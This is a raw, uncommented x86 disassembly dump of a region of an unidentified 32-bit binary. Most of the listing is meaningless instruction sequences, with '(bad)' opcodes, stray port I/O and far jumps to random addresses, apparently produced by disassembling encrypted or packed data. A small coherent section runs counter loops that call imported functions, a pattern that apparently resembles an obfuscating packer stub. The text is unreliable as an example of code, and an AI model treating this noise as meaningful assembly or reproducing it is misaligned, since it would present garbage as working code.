  40726f:	mov    cl,ah
  407271:	adc    eax,0x7bd51a9a
  407276:	pop    ebp
  407277:	loop   0x407244
  407279:	or     DWORD PTR [esi+0x6f],esi
  40727c:	sbb    BYTE PTR [edx+ebp*8-0x922865a],bl
  407283:	(bad)  
  407284:	jp     0x407282
  407286:	pop    ss
  407287:	test   BYTE PTR [ebp-0x59c7e01d],dh
  40728d:	shl    DWORD PTR [edx+ecx*8-0x4f],1
  407291:	stos   DWORD PTR es:[edi],eax
  407292:	fwait
  407293:	xchg   esp,eax
  407294:	addr16 jnp 0x40721b
  407297:	and    DWORD PTR [esi+0x3c55cc83],esi
  40729d:	dec    ebx
  40729e:	jg     0x4072a1
  4072a0:	dec    eax
  4072a1:	mov    eax,ds:0xf3e607a
  4072a6:	jae    0x4072fb
  4072a8:	popa   
  4072a9:	and    al,0xf2
  4072ab:	inc    DWORD PTR [edi]
  4072ad:	xor    ecx,ebx
  4072af:	and    edi,edx
  4072b1:	and    dl,bh
  4072b3:	and    ah,BYTE PTR [edi-0x5]
  4072b6:	push   0x17
  4072b8:	iret   
  4072b9:	or     DWORD PTR [esi+0x2e],ecx
  4072bc:	in     al,0xfc
  4072be:	mov    al,ds:0xe0558be4
  4072c3:	mov    ebx,DWORD PTR [ebp-0x8]
  4072c6:	xor    edx,eax
  4072c8:	add    edx,ecx
  4072ca:	imul   edx,ebx
  4072cd:	cmp    edx,edi
  4072cf:	jbe    0x40619a
  4072d5:	pop    ebx
  4072d6:	jmp    0x407428
  4072db:	push   ds
  4072dc:	cld    
  4072dd:	dec    edi
  4072de:	or     ebp,DWORD PTR [ebp-0x27]
  4072e1:	jp     0x40728c
  4072e3:	adc    edi,0x34550f0c
  4072e9:	mov    ds:0x7e18f8cd,al
  4072ee:	jle    0x407313
  4072f0:	jg     0x407370
  4072f2:	jle    0x4072c4
  4072f4:	loop   0x40732b
  4072f6:	dec    esi
  4072f7:	or     al,0xfb
  4072f9:	push   ss
  4072fa:	nop
  4072fb:	std    
  4072fc:	repnz push ecx
  4072fe:	outs   dx,BYTE PTR ds:[esi]
  4072ff:	sbb    al,0xc0
  407301:	adc    dl,bh
  407303:	adc    bh,BYTE PTR [ebp+esi*1+0x3cd5bdb9]
  40730a:	scas   al,BYTE PTR es:[edi]
  40730b:	dec    eax
  40730c:	sub    DWORD PTR [eax-0x652b05c8],edx
  407312:	jbe    0x4072d4
  407314:	lods   eax,DWORD PTR ds:[esi]
  407315:	mov    ds:0xa0da81e1,eax
  40731a:	ins    BYTE PTR es:[edi],dx
  40731b:	shr    DWORD PTR [esi],1
  40731d:	rol    DWORD PTR [edx],0xb8
  407320:	cmp    eax,DWORD PTR [esi-0x49]
  407323:	add    dl,BYTE PTR [ebx+0x2a]
  407326:	sub    eax,0xa29c5b0d
  40732b:	movups xmm2,xmm6
  40732e:	jecxz  0x407303
  407330:	jp     0x40734e
  407332:	iret   
  407333:	imul   edi,DWORD PTR [esp+esi*1+0x22],0xffffffa4
  407338:	or     ch,dl
  40733a:	rcr    DWORD PTR [esi],0xfe
  40733d:	out    0xeb,eax
  40733f:	and    BYTE PTR [esi+0x1ddcefdf],bl
  407345:	scas   al,BYTE PTR es:[edi]
  407346:	nop
  407347:	sbb    ah,BYTE PTR [ecx+0x8]
  40734a:	xchg   ecx,eax
  40734b:	inc    edx
  40734c:	(bad)  
  40734d:	(bad)  [eax+edi*1+0x5e78a3bc]
  407354:	mov    eax,0x896255d7
  407359:	xchg   ecx,eax
  40735a:	sub    ah,dl
  40735c:	dec    eax
  40735d:	adc    bl,BYTE PTR [edi]
  40735f:	jns    0x407338
  407361:	daa    
  407362:	pusha  
  407363:	sti    
  407364:	lods   al,BYTE PTR ds:[esi]
  407365:	inc    ebx
  407366:	sub    DWORD PTR [eax],edx
  407368:	adc    bh,BYTE PTR [eax-0x44]
  40736b:	icebp  
  40736c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40736d:	imul   edx,DWORD PTR [esi+0x15],0x2e911d90
  407374:	and    dl,BYTE PTR [eax+esi*1]
  407377:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407378:	or     al,0x7b
  40737a:	test   eax,0x3b83fa6c
  40737f:	xchg   edx,eax
  407380:	sub    DWORD PTR [eax+0x7c],0x18
  407384:	xchg   BYTE PTR [edi+0x7dfdb1ac],dl
  40738a:	jecxz  0x4073b8
  40738c:	jge    0x407368
  40738e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40738f:	lods   al,BYTE PTR ds:[esi]
  407390:	(bad)  
  407392:	arpl   WORD PTR [eax+0x36],si
  407395:	mov    ecx,0xc79d7ecc
  40739a:	xor    eax,0xa8b5d451
  40739f:	inc    ebx
  4073a0:	iret   
  4073a1:	stos   BYTE PTR es:[edi],al
  4073a2:	or     dh,BYTE PTR [esi]
  4073a4:	call   0x74066668
  4073a9:	jmp    0x5bd8:0x3bc5b876
  4073b0:	xor    eax,0x3c18e95e
  4073b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073b6:	ds jnp 0x407385
  4073b9:	mov    ebx,0x43a98709
  4073be:	(bad)  
  4073bf:	jno    0x4073a0
  4073c1:	xor    al,0x8c
  4073c3:	sub    BYTE PTR [eax+0x6f],0xf2
  4073c7:	xchg   ecx,eax
  4073c8:	adc    DWORD PTR [esi-0x2d],ebx
  4073cb:	adc    BYTE PTR [bx-0x262f],bh
  4073d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073d1:	ins    DWORD PTR es:[edi],dx
  4073d2:	mov    ah,0x11
  4073d4:	dec    eax
  4073d5:	mov    WORD PTR [edi-0xa],gs
  4073d8:	repnz cli 
  4073da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073db:	jp     0x4073b5
  4073dd:	push   esi
  4073de:	das    
  4073df:	sbb    edx,eax
  4073e1:	mov    BYTE PTR [ebp+0x66],bl
  4073e4:	pushf  
  4073e5:	cli    
  4073e6:	sbb    bh,BYTE PTR [edi+ecx*1-0x4b2f6a3c]
  4073ed:	mov    ah,0x55
  4073ef:	inc    edx
  4073f0:	enter  0xfbc9,0x5c
  4073f4:	in     eax,0xdd
  4073f6:	or     edx,DWORD PTR [ecx+0x1d]
  4073f9:	mov    ch,bh
  4073fb:	pop    es
  4073fc:	je     0x40745f
  4073fe:	das    
  4073ff:	ror    DWORD PTR [edx-0x58],cl
  407402:	clc    
  407403:	and    al,0xdf
  407405:	xchg   ebp,eax
  407406:	pushf  
  407407:	inc    edi
  407408:	sub    eax,0x3f4e007f
  40740d:	dec    esp
  40740e:	mov    esp,0x8a1f7a95
  407413:	clc    
  407414:	dec    edi
  407415:	ficomp DWORD PTR [edx+0x4956adb]
  40741b:	mov    eax,0x57fa242e
  407420:	or     DWORD PTR [ebx-0x14],0x4d
  407424:	dec    esp
  407425:	fisttp DWORD PTR [edx]
  407427:	xchg   esi,eax
  407428:	pop    edi
  407429:	leave  
  40742a:	ret    0x8
  40742d:	push   ebp
  40742e:	mov    ebp,esp
  407430:	jmp    0x4075bc
  407435:	jb     0x407447
  407437:	test   eax,0x8a95a91d
  40743c:	adc    DWORD PTR [ebp+eax*1-0x6793d801],edi
  407443:	cmp    al,0xc9
  407445:	lods   eax,DWORD PTR ds:[esi]
  407446:	sbb    DWORD PTR [esi+0x7e],edi
  407449:	jmp    0x18bef2cd
  40744e:	adc    eax,0x71b058eb
  407453:	push   ss
  407454:	add    DWORD PTR [edx+ecx*1],edx
  407457:	jl     0x407432
  407459:	mov    ecx,0x488841ca
  40745e:	pop    edi
  40745f:	add    esp,DWORD PTR [esi-0x619cfc66]
  407465:	cmp    eax,DWORD PTR [esi-0x22]
  407468:	adc    WORD PTR [esi+eiz*2-0x15],si
  40746d:	das    
  40746e:	outs   dx,BYTE PTR gs:[esi]
  407470:	inc    ebx
  407471:	je     0x4074e6
  407473:	mov    ebp,0xbf5873b3
  407478:	xlat   BYTE PTR ds:[ebx]
  407479:	cmp    ebp,DWORD PTR [ecx]
  40747b:	cmpps  xmm5,XMMWORD PTR [esi],0x16
  40747f:	int3   
  407480:	xor    edx,esp
  407482:	test   al,0x8e
  407484:	xor    esp,DWORD PTR [ecx]
  407486:	scas   eax,DWORD PTR es:[edi]
  407487:	sbb    BYTE PTR [esi-0x55],cl
  40748a:	mov    BYTE PTR [edx],bh
  40748c:	mov    ds:0x839f5c77,eax
  407491:	les    edx,FWORD PTR [ecx]
  407493:	add    eax,DWORD PTR [edx-0x13b44c72]
  407499:	fcom   DWORD PTR [esi-0x51]
  40749c:	cld    
  40749d:	xor    ebx,ebp
  40749f:	inc    edi
  4074a0:	lock jecxz 0x4074da
  4074a3:	in     eax,0xa4
  4074a5:	std    
  4074a6:	out    0x58,ax
  4074a9:	inc    ecx
  4074aa:	repnz repz hlt 
  4074ad:	dec    esi
  4074ae:	or     al,0x80
  4074b0:	jae    0x40750f
  4074b2:	xlat   BYTE PTR ds:[ebx]
  4074b3:	pop    ecx
  4074b4:	pop    edi
  4074b5:	cmc    
  4074b6:	mov    WORD PTR [eax-0x1ade786],ss
  4074bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074bd:	pushf  
  4074be:	(bad)  
  4074bf:	fimul  WORD PTR [eax-0x1f]
  4074c2:	pop    edx
  4074c3:	xor    ah,BYTE PTR [ecx+0x4ccd649e]
  4074c9:	jnp    0x407492
  4074cb:	xchg   ebx,eax
  4074cc:	ins    DWORD PTR es:[edi],dx
  4074cd:	xor    DWORD PTR [esp+edx*1],0x1a
  4074d1:	arpl   WORD PTR [eax+ebx*4],cx
  4074d4:	popa   
  4074d5:	gs jp  0x407529
  4074d8:	mov    esp,0x831c5b1b
  4074dd:	imul   eax,esi,0xda366d7a
  4074e3:	mov    esp,0x65ed69b9
  4074e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074e9:	mov    al,BYTE PTR [esi+0xd429dc1]
  4074ef:	loope  0x407520
  4074f1:	(bad)  
  4074f2:	sub    al,0x83
  4074f4:	xchg   ebp,eax
  4074f5:	xor    esi,DWORD PTR [esi-0x52c1c660]
  4074fb:	rol    DWORD PTR [esi-0x7],0x70
  4074ff:	pop    esi
  407500:	mov    esi,0xcf919b26
  407505:	push   0xffffffb6
  407507:	ja     0x4074b6
  407509:	and    al,BYTE PTR [ecx+0x5]
  40750c:	sbb    dh,cl
  40750e:	xchg   ecx,eax
  40750f:	lods   eax,DWORD PTR ds:[esi]
  407510:	adc    DWORD PTR [ebp+0x6a],ebx
  407513:	aas    
  407514:	add    DWORD PTR [edi-0x3e],ebx
  407517:	or     esi,DWORD PTR [ecx+0x68]
  40751a:	int3   
  40751b:	imul   ebp,DWORD PTR [eax],0x6eb869a6
  407521:	add    DWORD PTR [edi-0x74],esp
  407524:	addr16 dec edx
  407526:	mov    dh,0x54
  407528:	cmp    bl,BYTE PTR ds:0xb0994eb3
  40752e:	xor    dh,0xac
  407531:	mov    eax,0x422f8536
  407536:	mov    WORD PTR [eax],?
  407538:	mov    dh,0x70
  40753a:	xchg   edi,eax
  40753b:	add    dl,BYTE PTR [eax-0x5b10614]
  407541:	inc    edi
  407542:	add    DWORD PTR [ebp-0x3c],esp
  407545:	dec    ecx
  407546:	aaa    
  407547:	pop    ebx
  407548:	fisub  WORD PTR [edi+0x7c]
  40754b:	lock div DWORD PTR [edx]
  40754e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40754f:	cmp    BYTE PTR [esi],ah
  407551:	aas    
  407552:	or     BYTE PTR [ebx+0x4b6eed2b],bl
  407558:	xchg   ebx,esi
  40755a:	out    dx,eax
  40755b:	fwait
  40755c:	icebp  
  40755d:	leave  
  40755e:	pusha  
  40755f:	push   ebx
  407560:	jp     0x4075b6
  407562:	test   al,0xcf
  407564:	jb     0x407568
  407566:	xchg   ecx,eax
  407567:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407568:	push   cs
  407569:	imul   edx,ebp,0x7c
  40756c:	add    esp,DWORD PTR [eax+ebp*2-0x7b71f771]
  407573:	shr    dl,1
  407575:	stc    
  407576:	pop    ebp
  407577:	push   ecx
  407578:	and    al,0x65
  40757a:	outs   dx,BYTE PTR ds:[esi]
  40757b:	(bad)  
  40757c:	dec    ebx
  40757d:	mov    ah,0x80
  40757f:	(bad)  
  407580:	mov    esi,0xd01d0104
  407585:	nop
  407586:	test   eax,0x33ea5566
  40758b:	jp     0x4075c8
  40758d:	sub    cl,BYTE PTR [edx+0x37]
  407590:	inc    esp
  407591:	sub    eax,0x99e1695e
  407596:	dec    dl
  407598:	shl    DWORD PTR [edi],cl
  40759a:	push   edi
  40759b:	cmc    
  40759c:	sbb    BYTE PTR [edi+0x18604aea],al
  4075a2:	int3   
  4075a3:	adc    eax,0x854befe7
  4075a8:	xchg   ecx,eax
  4075a9:	add    ch,BYTE PTR [edx-0x4d7215c]
  4075af:	add    al,0x3d
  4075b1:	das    
  4075b2:	les    edx,FWORD PTR [ebx-0x62]
  4075b5:	push   ebx
  4075b6:	jns    0x407581
  4075b8:	loop   0x4075c0
  4075ba:	mov    WORD PTR [eax+0x25815151],ds
  4075c0:	into   
  4075c1:	stos   DWORD PTR es:[edi],eax
  4075c2:	inc    ecx
  4075c3:	add    BYTE PTR [eax],al
  4075c5:	add    BYTE PTR [eax],al
  4075c7:	add    cl,ch
  4075c9:	or     eax,0x8b000000
  4075ce:	adc    eax,0x41abce
  4075d3:	inc    edx
  4075d4:	mov    DWORD PTR ds:0x41abce,edx
  4075da:	cmp    DWORD PTR ds:0x41abce,0x1e
  4075e1:	jae    0x407619
  4075e7:	cmp    DWORD PTR ds:0x41abce,0x20
  4075ee:	jne    0x40760a
  4075f4:	push   DWORD PTR [ebp-0x28]
  4075f7:	push   0x365e
  4075fc:	push   DWORD PTR [ebp-0x18]
  4075ff:	push   0x4c62
  407604:	call   DWORD PTR ds:0x40d004
  40760a:	jmp    0x4075cd
  40760f:	xor    DWORD PTR ds:0x412374,0x3a52
  407619:	mov    eax,0xf89c8538
  40761e:	sub    ecx,ecx
  407620:	mov    DWORD PTR [ebp-0x8],eax
  407623:	and    DWORD PTR ds:0x41abd6,0x0
  40762d:	jmp    0x40763f
  407632:	mov    ecx,DWORD PTR ds:0x41abd6
  407638:	inc    ecx
  407639:	mov    DWORD PTR ds:0x41abd6,ecx
  40763f:	cmp    DWORD PTR ds:0x41abd6,0x1e
  407646:	jae    0x4076c6
  40764c:	cmp    DWORD PTR ds:0x41abd6,0x2d
  407653:	jne    0x40765f
  407659:	call   DWORD PTR ds:0x40d1d8
  40765f:	jmp    0x407632
  407664:	and    DWORD PTR ds:0x417e45,0x0
  40766e:	jmp    0x407680
  407673:	mov    edx,DWORD PTR ds:0x417e45
  407679:	inc    edx
  40767a:	mov    DWORD PTR ds:0x417e45,edx
  407680:	cmp    DWORD PTR ds:0x417e45,0x1b
  407687:	jae    0x4076c6
  40768d:	cmp    DWORD PTR ds:0x417e45,0x8
  407694:	jne    0x4076a5
  40769a:	push   0x41abea
  40769f:	call   DWORD PTR ds:0x40d1dc
  4076a5:	cmp    DWORD PTR ds:0x417e45,0x7
  4076ac:	jne    0x4076c1
  4076b2:	xor    edx,edx
  4076b4:	add    edx,DWORD PTR ds:0x417e45
  4076ba:	inc    edx
  4076bb:	mov    DWORD PTR ds:0x417e45,edx
  4076c1:	jmp    0x407673
  4076c6:	mov    DWORD PTR [ebp-0x4],0xf89c853b
  4076cd:	mov    edx,DWORD PTR [ebp-0x8]
  4076d0:	push   esi
  4076d1:	adc    esi,ecx
  4076d3:	mov    ecx,0x7510859
  4076d8:	xor    edx,ecx
  4076da:	mov    esi,0x32729f
  4076df:	push   edi
  4076e0:	mov    edi,DWORD PTR [ebp+0x10]
  4076e3:	add    edx,esi
  4076e5:	cmp    edi,edx
  4076e7:	jmp    0x407873
  4076ec:	iret   
  4076ed:	in     eax,0x74
  4076ef:	push   edx
  4076f0:	adc    al,0x63
  4076f2:	jns    0x40776d
  4076f4:	int    0x3e
  4076f6:	les    ebp,FWORD PTR [esi+0x19]
  4076f9:	adc    edi,ebp
  4076fb:	pusha  
  4076fc:	sbb    al,0x1f
  4076fe:	jle    0x40777e
  407700:	jmp    0x9fbef584
  407705:	out    0xc,al
  407707:	inc    eax
  407708:	jmp    0x92320f86
  40770d:	fcomi  st,st(2)
  40770f:	jbe    0x407758
  407711:	mov    WORD PTR [eax-0xb],cs
  407714:	dec    edx
  407715:	jae    0x407712
  407717:	sti    
  407718:	outs   dx,BYTE PTR ds:[esi]
  407719:	out    dx,al
  40771a:	je     0x40773d
  40771c:	es pop esi
  40771e:	call   0xd70f21a6
  407723:	ins    DWORD PTR es:[edi],dx
  407724:	jg     0x407758
  407726:	or     eax,DWORD PTR [edi-0x64]
  407729:	inc    ecx
  40772a:	stos   DWORD PTR es:[edi],eax
  40772b:	cdq    
  40772c:	and    BYTE PTR [eax+ecx*2+0x1b],cl
  407730:	pop    ebp
  407731:	popf   
  407732:	sahf   
  407733:	lahf   
  407734:	and    eax,0x66d3edf8
  407739:	(bad)  
  40773a:	lahf   
  40773b:	cmp    dh,dl
  40773d:	pop    eax
  40773e:	stos   BYTE PTR es:[edi],al
  40773f:	mov    dh,0xc2
  407741:	loopne 0x40778d
  407743:	arpl   cx,ax
  407745:	mov    DWORD PTR [edx+0x74],ebx
  407748:	es subps xmm3,XMMWORD PTR gs:[ebp+0xa]
  40774e:	sbb    DWORD PTR [esi],edx
  407750:	repnz test al,0x38
  407753:	cmp    BYTE PTR ds:0x1852a86d,cl
  407759:	out    dx,eax
  40775a:	mov    ecx,0x48a7cc4d
  40775f:	sub    al,0x89
  407761:	das    
  407762:	mov    dl,BYTE PTR [eax-0x4e]
  407765:	retf   
  407766:	pop    ecx
  407767:	or     bh,BYTE PTR [edx+ebx*2+0x36e43308]
  40776e:	fisttp DWORD PTR [ebx+0x2d]
  407771:	iret   
  407772:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407773:	arpl   bx,cx
  407775:	sbb    al,0x2f
  407777:	je     0x4077c2
  407779:	lds    ebx,FWORD PTR [esi-0x15eeed1c]
  40777f:	inc    edx
  407780:	vsqrtsd xmm7,xmm6,QWORD PTR [esi]
  407784:	cmp    eax,0x1d6cb79c
  407789:	mov    cl,0x4a
  40778b:	push   ebp
  40778c:	mov    BYTE PTR [esi],bl
  40778e:	or     eax,0x77e162ad
  407793:	lods   al,BYTE PTR ds:[esi]
  407794:	ficom  WORD PTR [edx-0x79]
  407797:	and    BYTE PTR [edi+0x39],bl
  40779a:	push   ds
  40779b:	ficom  WORD PTR [ebx]
  40779d:	inc    esp
  40779e:	sub    dh,ah
  4077a0:	xchg   ebx,eax
  4077a1:	and    ah,BYTE PTR [ecx+ecx*4-0x54d2054f]
  4077a8:	add    al,0x2d
  4077aa:	sub    DWORD PTR [ecx+0x65],edi
  4077ad:	(bad)  
  4077ae:	out    dx,eax
  4077af:	lods   eax,DWORD PTR ds:[esi]
  4077b0:	inc    ecx
  4077b1:	mov    ebp,0xcfdeebbc
  4077b6:	cdq    
  4077b7:	mov    ecx,DWORD PTR [ebp+0x1de5eccd]
  4077bd:	push   es
  4077be:	dec    ecx
  4077bf:	sbb    BYTE PTR [esi],dl
  4077c1:	ror    esi,1
  4077c3:	adc    eax,0x780ab40
  4077c8:	imul   ebx,DWORD PTR [ebx+0x2b],0x1c
  4077cc:	dec    ebp
  4077cd:	xchg   edi,eax
  4077ce:	lds    ebp,FWORD PTR ds:0x5942be92
  4077d4:	sar    ah,1
  4077d6:	cmc    
  4077d7:	dec    eax
  4077d8:	outs   dx,BYTE PTR ds:[esi]
  4077d9:	jp     0x4077bb
  4077db:	cmc    
  4077dc:	pop    es
  4077dd:	inc    ecx
  4077de:	cmp    al,0xf1
  4077e0:	xchg   ecx,eax
  4077e1:	mov    edx,0xabc1e061
  4077e6:	lahf   
  4077e7:	mov    ah,0xbe
  4077e9:	mov    ah,0x38
  4077eb:	mov    dl,0x41
  4077ed:	add    eax,0x4c9964bd
  4077f2:	lods   al,BYTE PTR ds:[esi]
  4077f3:	mov    ebp,edi
  4077f5:	sbb    BYTE PTR [ecx+0x63],ch
  4077f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077f9:	mov    eax,0x4dc4a29c
  4077fe:	jo     0x40786d
  407800:	jmp    0xf63b:0x6ef48de7
  407807:	out    0x15,al
  407809:	imul   edx,DWORD PTR [ebp+0x2504cf39],0xa03f84b3
  407813:	nop
  407814:	pop    ebx
  407815:	jmp    0xf011:0xe0379da8
  40781c:	not    edx
  40781e:	dec    ecx
  40781f:	jmp    0x4077f8
  407821:	les    esi,FWORD PTR [esi]
  407823:	popf   
  407824:	cwde   
  407825:	cs aam 0xc8
  407828:	and    BYTE PTR [bx+di-0x4f1a],bl
  40782d:	les    esi,FWORD PTR [esi-0x9dcdf06]
  407833:	push   ss
  407834:	mov    ds:0xc45cbf05,al
  407839:	pop    esp
  40783a:	loopne 0x4077c5
  40783c:	mov    bh,0x1b
  40783e:	jg     0x4077c5
  407840:	ror    BYTE PTR [edi+0x2f4b52f7],cl
  407846:	inc    ebp
  407847:	stc    
  407848:	mov    cl,0x8a
  40784a:	js     0x40782e
  40784c:	shr    dh,0x5
  40784f:	mov    ds:0x81e6f21f,eax
  407854:	cmp    BYTE PTR [esi],0x2d
  407857:	add    al,0x4c
  407859:	jg     0x407820
  40785b:	xlat   BYTE PTR ds:[ebx]
  40785c:	ror    dh,1
  40785e:	xchg   edi,eax
  40785f:	mov    esp,edx
  407861:	fdiv   QWORD PTR [eax-0x7d]
  407864:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407865:	loop   0x407830
  407867:	test   al,0xa5
  407869:	aas    
  40786a:	lock in eax,0xdf
  40786d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40786e:	enter  0x6709,0xbb
  407872:	dec    edi
  407873:	je     0x407c04
  407879:	jmp    0x407a05
  40787e:	in     eax,dx
  40787f:	(bad)  
  407880:	pop    esi
  407881:	jg     0x4078d7
  407883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407884:	ins    DWORD PTR es:[edi],dx
  407885:	in     eax,0x5e
  407887:	imul   eax,DWORD PTR [esi+0x52227a8c],0x48
  40788e:	(bad)  
  40788f:	sbb    al,0x7e
  407891:	jle    0x40787c
  407893:	jg     0x407913
  407895:	jle    0x407894
  407897:	jnp    0x4078af
  407899:	enter  0x4558,0xba
  40789d:	outs   dx,DWORD PTR ds:[esi]
  40789e:	xchg   esi,eax
  40789f:	mov    ss,WORD PTR [ebp+0x4ad2f6d]
  4078a5:	fstp   QWORD PTR [edi]
  4078a7:	jb     0x407894
  4078a9:	je     0x40784b
  4078ab:	aaa    
  4078ac:	sbb    BYTE PTR [edx-0x2124fd16],al
  4078b2:	jle    0x407874
  4078b4:	jnp    0x407892
  4078b6:	and    eax,DWORD PTR [edi-0x3e5efc28]
  4078bc:	(bad)  
  4078bd:	sbb    eax,0xf864bb84
  4078c2:	loop   0x40792a
  4078c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078c5:	cld    
  4078c6:	daa    
  4078c7:	call   0x5f36c050
  4078cc:	stos   DWORD PTR es:[edi],eax
  4078cd:	sti    
  4078ce:	sbb    BYTE PTR [edi+ebx*2-0x6e],ch
  4078d2:	cli    
  4078d3:	sbb    bh,BYTE PTR [edx+0x79d9ea26]
  4078d9:	sar    BYTE PTR [eax+0xd3ad634],1
  4078df:	jmp    0x1878:0x7a08716b
  4078e6:	aam    0xfa
  4078e8:	mov    edi,0x40b82f9d
  4078ed:	or     al,0x13
  4078f0:	jp     0x407922
  4078f2:	xor    eax,0xf1c77bba
  4078f7:	inc    ebp
  4078f8:	sub    BYTE PTR [esi],dh
  4078fa:	sbb    dl,ah
  4078fc:	fistp  DWORD PTR [edi+0x5d4eaf03]
  407902:	fist   DWORD PTR [edx]
  407904:	stos   BYTE PTR es:[edi],al
  407905:	(bad)  [ebx]
  407907:	div    eax
  407909:	jns    0x407941
  40790b:	pop    es
  40790c:	addr16 push esi
  40790e:	inc    eax
  40790f:	scas   al,BYTE PTR es:[edi]
  407910:	cdq    
  407911:	fsub   DWORD PTR [edi+edx*4]
  407914:	outs   dx,BYTE PTR ds:[esi]
  407915:	xor    eax,0x2778b852
  40791a:	fdivr  QWORD PTR [edi-0x1a111a4]
  407920:	pop    esi
  407921:	cmp    esi,DWORD PTR ss:[eax]
  407924:	in     al,0x75
  407926:	pop    esp
  407927:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407928:	mov    ebx,0xb486747f
  40792d:	cmp    al,0x96
  40792f:	pop    ecx
  407930:	sbb    ch,BYTE PTR [ebx]
  407932:	mov    edx,0xecaef712
  407937:	hlt    
  407938:	push   ss
  407939:	mov    WORD PTR [ecx+ebp*2+0x70],ss
  40793d:	jg     0x407953
  40793f:	bnd jmp 0x4078cc
  407942:	std    
  407943:	push   0x7f
  407945:	and    DWORD PTR [ecx+0x19],ecx
  407948:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407949:	cwde   
  40794a:	push   cs
  40794b:	sub    esi,eax
  40794d:	je     0x4078f9
  40794f:	fidivr DWORD PTR [edi+0x4c]
  407952:	jp     0x40799d
  407954:	adc    eax,0xf485c285
  407959:	mov    al,0x9b
  40795b:	jmp    0x2a2:0xbac5247
  407962:	pop    ebp
  407963:	cs out 0xaa,eax
  407966:	push   ss
  407967:	fs cmp eax,0x2a4109a1
  40796d:	ja     0x407932
  40796f:	gs jbe 0x40799f
  407972:	inc    eax
  407973:	jno    0x4079f1
  407975:	push   esi
  407976:	sbb    dl,cl
  407978:	cwde   
  407979:	sbb    al,0xde
  40797b:	or     al,BYTE PTR [ebx+0x19ae7522]
  407981:	(bad)  
  407982:	mov    edi,0xd5f2d48e
  407987:	xchg   edi,eax
  407988:	das    
  407989:	imul   ebp,eax,0x93832c2a
  40798f:	jmp    0x45b9065f
  407994:	test   DWORD PTR [ebp+0x38d71846],eax
  40799a:	push   esp
  40799b:	mov    ebp,0x12a6007f
  4079a0:	mov    ecx,0xe8bb1c6f
  4079a5:	in     al,0x7a
  4079a7:	es cli 
  4079a9:	cmp    BYTE PTR [ebx+0x5655d04a],ch
  4079af:	or     al,0x32
  4079b1:	out    0xbf,al
  4079b3:	mov    ds:0x2e57dc0f,al
  4079b8:	sub    DWORD PTR [ebx-0x23],eax
  4079bb:	or     DWORD PTR [edx+eiz*8],ecx
  4079be:	push   cs
  4079bf:	jg     0x407964
  4079c1:	mov    cl,0x7a
  4079c3:	mov    eax,ds:0x8f9b68ef
  4079c8:	in     al,dx
  4079c9:	and    BYTE PTR [ebp-0x3031c2cd],ch
  4079cf:	shl    bh,0x4f
  4079d2:	std    
  4079d3:	xchg   ecx,eax
  4079d4:	gs push edi
  4079d6:	imul   ebx,DWORD PTR [edi-0x5f8e7900],0xffffff98
  4079dd:	(bad)  
  4079de:	call   0x292f:0x44c6ab0a
  4079e5:	or     al,0x6b
  4079e7:	ret    0xc068
  4079ea:	pop    ecx
  4079eb:	add    ah,bl
  4079ed:	clc    
  4079ee:	lock sbb al,BYTE PTR [esi-0x6d]
  4079f2:	popf   
  4079f3:	mov    eax,ds:0x503adc04
  4079f8:	(bad)
  4079fd:	or     ch,BYTE PTR [esi+eiz*4+0x1c]
  407a01:	inc    esi
  407a02:	scas   al,BYTE PTR es:[edi]
  407a03:	and    BYTE PTR [esi-0x7407aa75],cl
  407a09:	inc    ebp
  407a0a:	cld    
  407a0b:	xor    eax,ecx
  407a0d:	mov    edi,0xffcd8d61
  407a12:	sub    edi,eax
  407a14:	jmp    0x407ba0
  407a19:	les    edi,FWORD PTR [eax]
  407a1b:	add    ch,BYTE PTR [edi-0x1e]
  407a1e:	gs jns 0x4079da
  407a21:	dec    esp
  407a22:	hlt    
  407a23:	sbb    BYTE PTR [ecx-0x6d],0x8e
  407a27:	pop    edi
  407a28:	sub    DWORD PTR [esi+0x12],edi
  407a2b:	jle    0x407aab
  407a2d:	jmp    0x1bef8b1
  407a32:	loope  0x407a2b
  407a34:	out    dx,eax
  407a35:	es std 
  407a37:	in     eax,0x10
  407a39:	(bad)  
  407a3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a3d:	push   es
  407a3e:	or     dh,BYTE PTR [edi]
  407a40:	mov    al,BYTE PTR [ebx+0x27]
  407a43:	mov    WORD PTR [edi-0xd],?
  407a46:	jecxz  0x407a26
  407a48:	nop
  407a49:	test   DWORD PTR [eax+ecx*2-0x63],0x11e75633
  407a51:	add    al,0x47
  407a53:	jne    0x407a42
  407a55:	nop
  407a56:	scas   al,BYTE PTR es:[edi]
  407a57:	and    cl,BYTE PTR [ecx+0x1bdaba61]
  407a5d:	cmp    BYTE PTR [eax+0x2b],0x8d
  407a61:	xor    DWORD PTR ds:0x13f95bf1,eax
  407a67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a68:	mul    dl
  407a6a:	rol    DWORD PTR [ecx],0x40
  407a6d:	jae    0x407a84
  407a6f:	ret    0x1420
  407a72:	sub    bh,al
  407a74:	jnp    0x407ae9
  407a76:	lea    ecx,[eax+0xa]
  407a79:	push   edi
  407a7a:	and    DWORD PTR [eax],ecx
  407a7c:	repz and DWORD PTR [esi+0x366b2c76],esp
  407a83:	inc    ecx
  407a84:	jae    0x407a87
  407a86:	adc    ebp,DWORD PTR [ebx+eiz*1]
  407a89:	push   eax
  407a8a:	in     eax,0x82
  407a8c:	(bad)  
  407a8e:	shl    BYTE PTR [bx+0x3d],cl
